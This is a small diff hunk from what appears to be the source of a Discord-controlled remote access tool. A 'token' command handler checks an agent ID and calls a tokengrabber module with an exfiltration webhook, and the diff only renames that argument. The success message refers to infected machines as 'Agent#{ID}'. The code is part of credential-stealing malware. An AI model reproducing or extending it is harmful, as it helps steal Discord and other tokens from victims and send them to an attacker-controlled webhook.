@@ -231,7 +231,7 @@ async def token(context):
     word_list = command.split()
     if int(word_list[0]) == int(ID):
             try:
-                tokengrabber.main(TOKEN_WEBHOOK=TOKEN_WEBHOOK)
+                tokengrabber.main(WEBHOOK_URL=TOKEN_WEBHOOK)
                 my_embed = discord.Embed(title=f"Command executed succesfully on Agent#{ID}", color=0x00FF00)
                 await context.message.channel.send(embed=my_embed)
             except Exception as e:
